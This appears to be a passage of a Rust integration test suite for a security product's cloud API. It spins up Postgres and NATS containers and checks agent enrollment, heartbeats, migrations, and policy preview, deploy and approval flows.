#![allow(clippy::duplicate_mod, clippy::expect_used, clippy::unwrap_used)]

use std::io::{Cursor, Read};
use std::process::Command;
use std::sync::Arc;
use std::time::Duration;

use axum::body::{to_bytes, Body};
use axum::http::{Method, Request, StatusCode};
use chrono::Utc;
use futures::StreamExt;
use serde_json::Value;
use sha2::{Digest, Sha256};
use sqlx::row::Row;
use tower::ServiceExt;
use uuid::Uuid;

#[path = "models/case_evidence.rs"]
pub(crate) mod case_evidence;
#[path = "services/case_evidence.rs"]
pub(crate) mod case_evidence_service;

use crate::auth::api_key::hash_api_key;
use crate::config::Config;
use crate::db::{create_pool, run_migrations, PgPool};
use crate::routes;
use crate::services::alerter::AlerterService;
use crate::services::metering::MeteringService;
use crate::services::policy_distribution;
use crate::services::retention::RetentionService;
use crate::services::tenant_provisioner::{tenant_subject_prefix, TenantProvisioner};
use crate::state::AppState;

struct DockerContainer {
    id: String,
}

impl Drop for DockerContainer {
    fn drop(&mut self) {
        let _ = Command::new("docker").args(["rm", "-f", &self.id]).status();
    }
}

struct Harness {
    app: axum::Router,
    db: PgPool,
    nats: async_nats::Client,
    nats_url: String,
    tenant_id: Uuid,
    tenant_slug: String,
    api_key: String,
    signing_keypair: Arc<hush_core::Keypair>,
    _postgres: DockerContainer,
    _nats: DockerContainer,
}

struct ConsoleFixture {
    principal_id: Uuid,
    principal_stable_ref: String,
    endpoint_agent_id: String,
    endpoint_agent_row_id: Uuid,
    grant_id: Uuid,
    action_id: Uuid,
}

struct OperatorFlowFixture {
    agent_id: String,
    session_id: String,
    detection_raw_ref: String,
    response_raw_ref: String,
    principal_id: Uuid,
    response_subject: String,
    legacy_response_subject: String,
    grant_id: Uuid,
    finding_id: Uuid,
    case_id: String,
    action_id: Uuid,
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn policies_deploy_and_enroll_backfills_policy_kv_bucket() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let policy_yaml = "version: \"1.0.0\"\nrules: []\n";

    let token_resp = request_json(
        &harness.app,
        Method::POST,
        format!("/api/v1/tenants/{}/enrollment-tokens", harness.tenant_id),
        Some(&harness.api_key),
        Some(serde_json::json!({ "expires_in_hours": 24 })),
    )
    .await;
    assert_eq!(token_resp.0, StatusCode::OK);
    let enrollment_token = token_resp.1["enrollment_token"]
        .as_str()
        .expect("enrollment token missing")
        .to_string();

    let deploy_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/policies/deploy".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "policy_yaml": policy_yaml,
            "description": "integration-test"
        })),
    )
    .await;
    assert_eq!(deploy_resp.0, StatusCode::OK);
    assert_eq!(deploy_resp.1["tenant_slug"], harness.tenant_slug);

    let kp = hush_core::Keypair::generate();
    let enroll_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/agents/enroll".to_string(),
        None,
        Some(serde_json::json!({
            "enrollment_token": enrollment_token,
            "public_key": kp.public_key().to_hex(),
            "hostname": "integration-host",
            "version": "1.0.0"
        })),
    )
    .await;
    assert_eq!(enroll_resp.0, StatusCode::OK);

    let agent_id = enroll_resp.1["agent_id"]
        .as_str()
        .expect("agent_id missing")
        .to_string();
    let bucket = policy_distribution::policy_sync_bucket(
        &tenant_subject_prefix(&harness.tenant_slug),
        &agent_id,
    );

    let js = async_nats::jetstream::new(harness.nats.clone());
    let store = spine::nats_transport::ensure_kv(&js, &bucket, 1)
        .await
        .expect("kv should exist");
    let payload = store
        .get(policy_distribution::POLICY_SYNC_KEY)
        .await
        .expect("kv get should succeed")
        .expect("policy key should exist");
    let payload_yaml: serde_yaml::Value =
        serde_yaml::from_slice(payload.as_ref()).expect("policy payload YAML");
    assert_eq!(
        payload_yaml
            .get("policy_epoch")
            .and_then(serde_yaml::Value::as_u64),
        Some(1)
    );
    assert_eq!(
        payload_yaml
            .get("version")
            .and_then(serde_yaml::Value::as_str),
        Some("1.0.0")
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn api_key_auth_survives_invalid_bearer_header() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let list_resp = request_json_dual_auth(
        &harness.app,
        Method::GET,
        "/api/v1/agents".to_string(),
        Some("not-a-jwt"),
        Some(&harness.api_key),
        None,
    )
    .await;

    assert_eq!(list_resp.0, StatusCode::OK);
    assert!(list_resp.1.as_array().is_some());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn run_migrations_is_safe_under_concurrent_startup() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let postgres = run_container(&[
        "run",
        "-d",
        "--rm",
        "-e",
        "POSTGRES_USER=postgres",
        "-e",
        "POSTGRES_PASSWORD=postgres",
        "-e",
        "POSTGRES_DB=cloud_api",
        "-p",
        "127.0.0.1::5432",
        "postgres:16-alpine",
    ]);

    let pg_port = container_host_port(&postgres, 5432);
    let database_url = format!("postgres://postgres:postgres@127.0.0.1:{pg_port}/cloud_api");
    wait_for_postgres(&database_url).await;

    let pool_a = create_pool(&database_url).await.expect("create pool a");
    let pool_b = create_pool(&database_url).await.expect("create pool b");

    let (left, right) = tokio::join!(run_migrations(&pool_a), run_migrations(&pool_b));
    left.expect("first migration runner should succeed");
    right.expect("second migration runner should succeed");

    let applied: Vec<String> =
        sqlx::query_scalar::query_scalar("SELECT name FROM schema_migrations ORDER BY name")
            .fetch_all(&pool_a)
            .await
            .expect("read applied migrations");
    assert_eq!(applied, migration_names());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn run_migrations_backfills_markers_for_legacy_schema() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let postgres = run_container(&[
        "run",
        "-d",
        "--rm",
        "-e",
        "POSTGRES_USER=postgres",
        "-e",
        "POSTGRES_PASSWORD=postgres",
        "-e",
        "POSTGRES_DB=cloud_api",
        "-p",
        "127.0.0.1::5432",
        "postgres:16-alpine",
    ]);

    let pg_port = container_host_port(&postgres, 5432);
    let database_url = format!("postgres://postgres:postgres@127.0.0.1:{pg_port}/cloud_api");
    wait_for_postgres(&database_url).await;

    let db = create_pool(&database_url).await.expect("create pool");
    let mut tx = db.begin().await.expect("begin tx");
    sqlx::raw_sql::raw_sql(include_str!("../migrations/001_init.sql"))
        .execute(&mut *tx)
        .await
        .expect("apply legacy 001");
    sqlx::raw_sql::raw_sql(include_str!("../migrations/002_adaptive_sdr_schema.sql"))
        .execute(&mut *tx)
        .await
        .expect("apply legacy 002");
    sqlx::raw_sql::raw_sql(include_str!(
        "../migrations/003_adaptive_sdr_token_and_approval_flow.sql"
    ))
    .execute(&mut *tx)
    .await
    .expect("apply legacy 003");
    tx.commit().await.expect("commit legacy schema");

    run_migrations(&db)
        .await
        .expect("migration runner should backfill legacy markers");

    let applied: Vec<String> =
        sqlx::query_scalar::query_scalar("SELECT name FROM schema_migrations ORDER BY name")
            .fetch_all(&db)
            .await
            .expect("read applied migrations");
    assert_eq!(applied, migration_names());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn agents_heartbeat_recovers_stale_agent_and_reconciles_policy_kv() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let agent_id = "agent-heartbeat-int-1";
    let keypair = hush_core::Keypair::generate();
    let policy_yaml = "version: \"2.0.0\"\nrules: []\n";

    sqlx::query::query(
        r#"INSERT INTO agents (
               tenant_id,
               agent_id,
               name,
               public_key,
               status,
               metadata,
               last_heartbeat_at
           )
           VALUES ($1, $2, 'heartbeat-agent', $3, 'stale', '{}'::jsonb, now() - interval '1 day')"#,
    )
    .bind(harness.tenant_id)
    .bind(agent_id)
    .bind(keypair.public_key().to_hex())
    .execute(&harness.db)
    .await
    .expect("seed stale agent");

    policy_distribution::upsert_active_policy(
        &harness.db,
        harness.tenant_id,
        policy_yaml,
        Some("heartbeat-reconcile"),
    )
    .await
    .expect("upsert active policy");

    let heartbeat_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/agents/heartbeat".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "agent_id": agent_id,
            "metadata": {
                "source": "integration-heartbeat"
            }
        })),
    )
    .await;
    assert_eq!(heartbeat_resp.0, StatusCode::OK);
    assert_eq!(heartbeat_resp.1["status"], "ok");

    let row = sqlx::query::query(
        r#"SELECT status, last_heartbeat_at, metadata
           FROM agents
           WHERE tenant_id = $1 AND agent_id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(agent_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch agent after heartbeat");

    let status: String = row.try_get("status").expect("status");
    let last_heartbeat_at: Option<chrono::DateTime<chrono::Utc>> =
        row.try_get("last_heartbeat_at").expect("last_heartbeat_at");
    let metadata: Value = row.try_get("metadata").expect("metadata");
    assert_eq!(status, "active");
    assert!(last_heartbeat_at.is_some());
    assert_eq!(metadata["source"], "integration-heartbeat");

    let bucket = policy_distribution::policy_sync_bucket(
        &tenant_subject_prefix(&harness.tenant_slug),
        agent_id,
    );
    let js = async_nats::jetstream::new(harness.nats.clone());
    let store = spine::nats_transport::ensure_kv(&js, &bucket, 1)
        .await
        .expect("kv should exist");
    let payload = store
        .get(policy_distribution::POLICY_SYNC_KEY)
        .await
        .expect("kv get should succeed")
        .expect("policy key should exist");
    let payload_yaml: serde_yaml::Value =
        serde_yaml::from_slice(payload.as_ref()).expect("policy payload YAML");
    assert_eq!(
        payload_yaml
            .get("policy_epoch")
            .and_then(serde_yaml::Value::as_u64),
        Some(1)
    );
    assert_eq!(
        payload_yaml
            .get("version")
            .and_then(serde_yaml::Value::as_str),
        Some("2.0.0")
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn register_agent_creates_and_links_endpoint_principal() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let keypair = hush_core::Keypair::generate();
    let register_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/agents".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "agent_id": "agent-directory-int-1",
            "name": "Directory Agent",
            "public_key": keypair.public_key().to_hex(),
            "role": "coder",
            "trust_level": "high",
            "metadata": {
                "source": "integration-register"
            }
        })),
    )
    .await;
    assert_eq!(register_resp.0, StatusCode::OK);

    let row = sqlx::query::query(
        r#"SELECT a.principal_id,
                  p.principal_type,
                  p.stable_ref,
                  p.display_name,
                  p.trust_level
           FROM agents AS a
           JOIN principals AS p
             ON p.id = a.principal_id
           WHERE a.tenant_id = $1
             AND a.agent_id = 'agent-directory-int-1'"#,
    )
    .bind(harness.tenant_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch linked principal");

    let principal_id: Uuid = row.try_get("principal_id").expect("principal_id");
    let principal_type: String = row.try_get("principal_type").expect("principal_type");
    let stable_ref: String = row.try_get("stable_ref").expect("stable_ref");
    let display_name: String = row.try_get("display_name").expect("display_name");
    let trust_level: String = row.try_get("trust_level").expect("trust_level");

    assert_ne!(principal_id, Uuid::nil());
    assert_eq!(principal_type, "endpoint_agent");
    assert_eq!(stable_ref, "agent-directory-int-1");
    assert_eq!(display_name, "Directory Agent");
    assert_eq!(trust_level, "high");

    let list_resp = request_json(
        &harness.app,
        Method::GET,
        "/api/v1/agents".to_string(),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(list_resp.0, StatusCode::OK);
    assert_eq!(list_resp.1[0]["principal_id"], principal_id.to_string());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn delete_agent_removes_linked_endpoint_principal() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let keypair = hush_core::Keypair::generate();
    let endpoint_node_id = Uuid::new_v4();
    insert_endpoint_hierarchy_node(
        &harness.db,
        harness.tenant_id,
        endpoint_node_id,
        "Delete Agent",
        Some("agent-directory-delete-int-1"),
    )
    .await;
    let register_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/agents".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "agent_id": "agent-directory-delete-int-1",
            "name": "Delete Agent",
            "public_key": keypair.public_key().to_hex()
        })),
    )
    .await;
    assert_eq!(register_resp.0, StatusCode::OK);

    let agent_uuid = Uuid::parse_str(
        register_resp.1["id"]
            .as_str()
            .expect("agent id missing from register response"),
    )
    .expect("parse agent uuid");

    let agent_row = sqlx::query::query(
        r#"SELECT principal_id
           FROM agents
           WHERE tenant_id = $1
             AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(agent_uuid)
    .fetch_one(&harness.db)
    .await
    .expect("fetch agent principal");
    let principal_id: Uuid = agent_row
        .try_get::<Option<Uuid>, _>("principal_id")
        .expect("principal_id")
        .expect("principal should be linked");

    let delete_resp = request_json(
        &harness.app,
        Method::DELETE,
        format!("/api/v1/agents/{agent_uuid}"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(delete_resp.0, StatusCode::OK);
    assert_eq!(delete_resp.1["deleted"], true);

    let deleted_agent = sqlx::query::query(
        r#"SELECT 1
           FROM agents
           WHERE tenant_id = $1
             AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(agent_uuid)
    .fetch_optional(&harness.db)
    .await
    .expect("query deleted agent");
    assert!(deleted_agent.is_none());

    let deleted_principal = sqlx::query::query(
        r#"SELECT 1
           FROM principals
           WHERE tenant_id = $1
             AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(principal_id)
    .fetch_optional(&harness.db)
    .await
    .expect("query deleted principal");
    assert!(deleted_principal.is_none());

    let hierarchy_row = sqlx::query::query(
        r#"SELECT external_id
           FROM hierarchy_nodes
           WHERE tenant_id = $1
             AND id = $2"#,
    )
    .bind(harness.tenant_id)
    .bind(endpoint_node_id)
    .fetch_one(&harness.db)
    .await
    .expect("fetch hierarchy node");
    let endpoint_external_id: Option<String> =
        hierarchy_row.try_get("external_id").expect("external_id");
    assert_eq!(endpoint_external_id, None);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn agent_effective_policy_resolves_directory_attachments_in_precedence_order() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let keypair = hush_core::Keypair::generate();
    let agent_id = "agent-policy-int-1";
    let register_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/agents".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "agent_id": agent_id,
            "name": "Policy Agent",
            "public_key": keypair.public_key().to_hex()
        })),
    )
    .await;
    assert_eq!(register_resp.0, StatusCode::OK);
    let agent_uuid = Uuid::parse_str(
        register_resp.1["id"]
            .as_str()
            .expect("agent id missing from register response"),
    )
    .expect("parse agent uuid");

    let agent_row =
        sqlx::query::query("SELECT principal_id FROM agents WHERE tenant_id = $1 AND id = $2")
            .bind(harness.tenant_id)
            .bind(agent_uuid)
            .fetch_one(&harness.db)
            .await
            .expect("fetch agent principal");
    let principal_id: Uuid = agent_row
        .try_get::<Option<Uuid>, _>("principal_id")
        .expect("principal_id")
        .expect("principal should be linked");

    let swarm_id = Uuid::new_v4();
    let project_id = Uuid::new_v4();
    let capability_group_id = Uuid::new_v4();
    sqlx::query::query(
        r#"INSERT INTO swarms (id, tenant_id, slug, name, kind)
           VALUES ($1, $2, 'fleet-east', 'Fleet East', 'fleet')"#,
    )
    .bind(swarm_id)
    .bind(harness.tenant_id)
    .execute(&harness.db)
    .await
    .expect("seed swarm");
    sqlx::query::query(
        r#"INSERT INTO projects (id, tenant_id, swarm_id, slug, name, environment)
           VALUES ($1, $2, $3, 'payments-prod', 'Payments', 'prod')"#,
    )
    .bind(project_id)
    .bind(harness.tenant_id)
    .bind(swarm_id)
    .execute(&harness.db)
    .await
    .expect("seed project");
    sqlx::query::query(
        r#"INSERT INTO capability_groups (id, tenant_id, name, capabilities)
           VALUES ($1, $2, 'Responders', '[]'::jsonb)"#,
    )
    .bind(capability_group_id)
    .bind(harness.tenant_id)
    .execute(&harness.db)
    .await
    .expect("seed capability group");

    for (target_kind, target_id) in [
        ("swarm", swarm_id),
        ("project", project_id),
        ("capability_group", capability_group_id),
    ] {
        sqlx::query::query(
            r#"INSERT INTO principal_memberships (
                   tenant_id,
                   principal_id,
                   target_kind,
                   target_id
               )
               VALUES ($1, $2, $3, $4)"#,
        )
        .bind(harness.tenant_id)
        .bind(principal_id)
        .bind(target_kind)
        .bind(target_id)
        .execute(&harness.db)
        .await
        .expect("seed membership");
    }

    policy_distribution::upsert_active_policy(
        &harness.db,
        harness.tenant_id,
        "policy:\n  mode: tenant-base\n  regions:\n    - global\n  keep: true\n",
        Some("integration-effective-policy"),
    )
    .await
    .expect("seed tenant active policy");

    for (target_kind, target_id, priority, policy_yaml) in [
        (
            "tenant",
            None,
            10_i32,
            "policy:\n  mode: tenant-attachment\n",
        ),
        ("swarm", Some(swarm_id), 20_i32, "policy:\n  mode: swarm\n"),
        (
            "project",
            Some(project_id),
            30_i32,
            "policy:\n  regions:\n    - prod\n",
        ),
        (
            "capability_group",
            Some(capability_group_id),
            40_i32,
            "policy:\n  capability: responder\n",
        ),
        (
            "principal",
            Some(principal_id),
            50_i32,
            "policy:\n  keep: null\n  final: true\n",
        ),
    ] {
        sqlx::query::query(
            r#"INSERT INTO policy_attachments (
                   tenant_id,
                   target_kind,
                   target_id,
                   priority,
                   policy_yaml,
                   checksum_sha256
               )
               VALUES ($1, $2, $3, $4, $5, md5($5))"#,
        )
        .bind(harness.tenant_id)
        .bind(target_kind)
        .bind(target_id)
        .bind(priority)
        .bind(policy_yaml)
        .execute(&harness.db)
        .await
        .expect("seed policy attachment");
    }

    let effective_resp = request_json(
        &harness.app,
        Method::GET,
        format!("/api/v1/agents/{agent_uuid}/effective-policy"),
        Some(&harness.api_key),
        None,
    )
    .await;
    assert_eq!(effective_resp.0, StatusCode::OK);
    assert_eq!(effective_resp.1["principal_id"], principal_id.to_string());
    assert_eq!(
        effective_resp.1["source_attachments"]
            .as_array()
            .expect("source attachments array")
            .len(),
        5
    );

    let compiled_yaml = effective_resp.1["compiled_policy_yaml"]
        .as_str()
        .expect("compiled policy yaml");
    let compiled: Value = serde_yaml::from_str(compiled_yaml).expect("compiled yaml parses");
    assert_eq!(compiled["policy"]["mode"], "swarm");
    assert_eq!(compiled["policy"]["regions"][0], "prod");
    assert_eq!(compiled["policy"]["capability"], "responder");
    assert_eq!(compiled["policy"]["final"], true);
    assert!(compiled["policy"].get("keep").is_none());

    let heartbeat_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/agents/heartbeat".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "agent_id": agent_id,
            "metadata": {
                "source": "effective-policy-reconcile"
            }
        })),
    )
    .await;
    assert_eq!(heartbeat_resp.0, StatusCode::OK);

    let bucket = policy_distribution::policy_sync_bucket(
        &tenant_subject_prefix(&harness.tenant_slug),
        agent_id,
    );
    let js = async_nats::jetstream::new(harness.nats.clone());
    let store = spine::nats_transport::ensure_kv(&js, &bucket, 1)
        .await
        .expect("effective policy kv should exist");
    let payload = store
        .get(policy_distribution::POLICY_SYNC_KEY)
        .await
        .expect("effective policy kv get should succeed")
        .expect("effective policy key should exist");
    let distributed: Value =
        serde_yaml::from_slice(payload.as_ref()).expect("distributed policy yaml parses");
    assert_eq!(distributed["policy_epoch"], 6);
    assert_eq!(distributed["policy"]["mode"], "swarm");
    assert_eq!(distributed["policy"]["regions"][0], "prod");
    assert_eq!(distributed["policy"]["capability"], "responder");
    assert_eq!(distributed["policy"]["final"], true);
    assert!(distributed["policy"].get("keep").is_none());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn policies_preview_compiles_effective_policy_without_deploying() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let member_key = "cs_it_policy_preview_member";
    let viewer_key = "cs_it_policy_preview_viewer";
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        member_key,
        "policy-preview-member",
        &["write"],
    )
    .await;
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        viewer_key,
        "policy-preview-viewer",
        &[],
    )
    .await;

    let keypair = hush_core::Keypair::generate();
    let agent_id = "agent-policy-preview-int-1";
    let register_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/agents".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "agent_id": agent_id,
            "name": "Policy Preview Agent",
            "public_key": keypair.public_key().to_hex()
        })),
    )
    .await;
    assert_eq!(register_resp.0, StatusCode::OK);

    policy_distribution::upsert_active_policy(
        &harness.db,
        harness.tenant_id,
        "policy:\n  mode: current\n",
        Some("active-before-preview"),
    )
    .await
    .expect("seed active policy");

    sqlx::query::query(
        r#"INSERT INTO policy_attachments (
               tenant_id,
               target_kind,
               priority,
               policy_yaml,
               checksum_sha256
           )
           VALUES ($1, 'tenant', 10, $2, md5($2))"#,
    )
    .bind(harness.tenant_id)
    .bind("policy:\n  mode: tenant-preview-overlay\n  keep: null\n")
    .execute(&harness.db)
    .await
    .expect("seed tenant policy attachment");

    let preview_body = serde_json::json!({
        "policy_yaml": "policy:\n  mode: proposed\n  keep: true\npolicyEpoch: 999\n",
        "description": "member-authored preview",
        "agent_id": agent_id
    });
    let viewer_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/policies/preview".to_string(),
        Some(viewer_key),
        Some(preview_body.clone()),
    )
    .await;
    assert_eq!(viewer_resp.0, StatusCode::FORBIDDEN);

    let member_deploy_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/policies/deploy".to_string(),
        Some(member_key),
        Some(serde_json::json!({
            "policy_yaml": "policy:\n  mode: unauthorized-deploy\n"
        })),
    )
    .await;
    assert_eq!(member_deploy_resp.0, StatusCode::FORBIDDEN);

    let preview_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/policies/preview".to_string(),
        Some(member_key),
        Some(preview_body),
    )
    .await;
    assert_eq!(preview_resp.0, StatusCode::OK);
    assert_eq!(preview_resp.1["status"], "valid");
    assert_eq!(preview_resp.1["deploy_allowed"], false);
    assert_eq!(preview_resp.1["requires_deploy_approval"], true);
    assert_eq!(preview_resp.1["would_deploy_version"], 2);

    let distribution_yaml = preview_resp.1["distribution_policy_yaml"]
        .as_str()
        .expect("distribution policy yaml");
    let distribution: Value =
        serde_yaml::from_str(distribution_yaml).expect("distribution preview yaml parses");
    assert_eq!(distribution["policy_epoch"], 2);
    assert!(distribution.get("policyEpoch").is_none());

    let agent_effective = &preview_resp.1["agent_effective_policy"];
    assert_eq!(agent_effective["agent_id"], agent_id);
    assert_eq!(agent_effective["policy_epoch"], 3);
    assert_eq!(
        agent_effective["source_attachments"]
            .as_array()
            .expect("source attachments array")
            .len(),
        1
    );
    let effective_yaml = agent_effective["compiled_policy_yaml"]
        .as_str()
        .expect("compiled policy yaml");
    let effective: Value =
        serde_yaml::from_str(effective_yaml).expect("effective preview yaml parses");
    assert_eq!(effective["policy_epoch"], 3);
    assert_eq!(effective["policy"]["mode"], "tenant-preview-overlay");
    assert!(effective["policy"].get("keep").is_none());

    let active =
        policy_distribution::fetch_active_policy_by_tenant_id(&harness.db, harness.tenant_id)
            .await
            .expect("fetch active policy")
            .expect("active policy still present");
    assert_eq!(active.version, 1);
    assert_eq!(active.description.as_deref(), Some("active-before-preview"));
    assert!(active.policy_yaml.contains("mode: current"));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn policies_proposal_requires_admin_approval_before_deploying() {
    if !docker_available() {
        eprintln!("Skipping integration test: docker is unavailable");
        return;
    }

    let harness = setup_harness().await;
    let member_key = "cs_it_policy_proposal_member";
    let viewer_key = "cs_it_policy_proposal_viewer";
    let admin2_key = "cs_it_policy_proposal_admin2";
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        member_key,
        "policy-proposal-member",
        &["write"],
    )
    .await;
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        viewer_key,
        "policy-proposal-viewer",
        &[],
    )
    .await;
    insert_api_key_for_tenant(
        &harness.db,
        harness.tenant_id,
        admin2_key,
        "policy-proposal-admin-2",
        &["admin"],
    )
    .await;

    let keypair = hush_core::Keypair::generate();
    let impact_receipt_keypair = hush_core::Keypair::generate();
    let impact_receipt_keypair_two = hush_core::Keypair::generate();
    let agent_id = "agent-policy-proposal-int-1";
    let register_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/agents".to_string(),
        Some(&harness.api_key),
        Some(serde_json::json!({
            "agent_id": agent_id,
            "name": "Policy Proposal Agent",
            "public_key": keypair.public_key().to_hex()
        })),
    )
    .await;
    assert_eq!(register_resp.0, StatusCode::OK);
    for (endpoint_agent_id, public_key) in [
        (
            "endpoint-policy-1",
            impact_receipt_keypair.public_key().to_hex(),
        ),
        (
            "endpoint-policy-2",
            impact_receipt_keypair_two.public_key().to_hex(),
        ),
    ] {
        let register_endpoint_resp = request_json(
            &harness.app,
            Method::POST,
            "/api/v1/agents".to_string(),
            Some(&harness.api_key),
            Some(serde_json::json!({
                "agent_id": endpoint_agent_id,
                "name": format!("Policy Proposal Validation {endpoint_agent_id}"),
                "public_key": public_key
            })),
        )
        .await;
        assert_eq!(register_endpoint_resp.0, StatusCode::OK);
    }

    policy_distribution::upsert_active_policy(
        &harness.db,
        harness.tenant_id,
        "policy:\n  mode: current\n",
        Some("active-before-proposal"),
    )
    .await
    .expect("seed active policy");

    let now = Utc::now();
    for (
        offset_seconds,
        event_id,
        verdict,
        action_type,
        endpoint_agent_id,
        runtime_agent_id,
        principal_id,
        session_id,
        detection_ids,
    ) in [
        (
            0_i64,
            "proposal-impact-hunt-1",
            "allow",
            "process",
            "endpoint-policy-1",
            "runtime-policy-1",
            "principal-policy-1",
            "session-policy-1",
            vec!["package_script".to_string()],
        ),
        (
            1_i64,
            "proposal-impact-hunt-2",
            "warn",
            "tool",
            "endpoint-policy-1",
            "runtime-policy-2",
            "principal-policy-2",
            "session-policy-2",
            vec!["agent_secret_touch".to_string()],
        ),
        (
            2_i64,
            "proposal-impact-hunt-3",
            "deny",
            "network",
            "endpoint-policy-2",
            "runtime-policy-2",
            "principal-policy-2",
            "session-policy-2",
            vec!["egress_block".to_string()],
        ),
    ] {
        sqlx::query::query(
            r#"INSERT INTO hunt_events (
                   event_id,
                   tenant_id,
                   source,
                   kind,
                   timestamp,
                   ingested_at,
                   verdict,
                   severity,
                   summary,
                   action_type,
                   session_id,
                   endpoint_agent_id,
                   runtime_agent_id,
                   principal_id,
                   detection_ids,
                   target_kind,
                   target_id,
                   target_name,
                   envelope_hash,
                   issuer,
                   schema_name,
                   signature_valid,
                   raw_ref,
                   attributes
               ) VALUES (
                   $1, $2, 'endpoint', 'policy_history', $3, $4, $5, 'medium', $6, $7,
                   $8, $9, $10, $11, $12, 'policy_event', $1, $7, $13,
                   'spiffe://tenant/policy-proposal-test',
                   'clawdstrike.edr.policy_history.v1',
                   true,
                   $14,
                   '{}'::jsonb
               )"#,
        )
        .bind(event_id)
        .bind(harness.tenant_id)
        .bind(now - chrono::Duration::seconds(offset_seconds))
        .bind(now)
        .bind(verdict)
        .bind(format!("policy proposal history event {event_id}"))
        .bind(action_type)
        .bind(session_id)
        .bind(endpoint_agent_id)
        .bind(runtime_agent_id)
        .bind(principal_id)
        .bind(detection_ids)
        .bind(format!("hash-{event_id}"))
        .bind(format!("hunt-envelope:{event_id}"))
        .execute(&harness.db)
        .await
        .expect("seed policy proposal hunt history");
    }

    let viewer_create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/policies/proposals".to_string(),
        Some(viewer_key),
        Some(serde_json::json!({
            "policy_yaml": "policy:\n  mode: viewer-proposal\n"
        })),
    )
    .await;
    assert_eq!(viewer_create_resp.0, StatusCode::FORBIDDEN);

    let create_resp = request_json(
        &harness.app,
        Method::POST,
        "/api/v1/policies/proposals".to_string(),
        Some(member_key),
        Some(serde_json::json!({
            "policy_yaml": "policy:\n  mode: proposed-approved\npolicyEpoch: 99\n",
            "description": "proposal integration"
        })),
    )
    .await;
    assert_eq!(create_resp.0, StatusCode::OK);
    let proposal = &create_resp.1["proposal"];
    assert_eq!(proposal["status"], "pending");
    assert_eq!(proposal["base_active_policy_version"], 1);
    assert_eq!(proposal["proposed_policy_version"], 2);
    assert_eq!(proposal["required_approvals"], 2);
    assert_eq!(proposal["approval_count"], 0);
    assert_eq!(proposal["approvals_remaining"], 2);
    assert_eq!(proposal["preview"]["baseActivePolicyVersion"], 1);
    assert_eq!(proposal["preview"]["proposedPolicyVersion"], 2);
    assert_eq!(proposal["preview"]["distributionPolicyEpoch"], 2);
    assert_eq!(
        proposal["preview"]["simulationStatus"],
        "estimated_from_fleet_history"
    );
    assert_eq!(
        proposal["preview"]["fleetHistoryImpact"]["eventsSampled"],
        3
    );
    assert_eq!(
        proposal["preview"]["fleetHistoryImpact"]["candidateBreakageCount"],
        2
    );
    assert_eq!(
        proposal["preview"]["fleetHistoryImpact"]["blockingEventCount"],
        1
    );
    assert_eq!(
        proposal["preview"]["fleetHistoryImpact"]["affectedEndpointCount"],
        2
    );
    let history_hash = proposal["preview"]["fleetHistoryImpact"]["historySha256"]
        .as_str()
        .expect("fleet history impact hash");
    assert_eq!(history_hash.len(), 64);
    assert_eq!(
        proposal["preview"]["fleetRuleDiffValidation"]["status"],
        "ready_for_endpoint_receipt_collection"
    );
    assert_eq!(
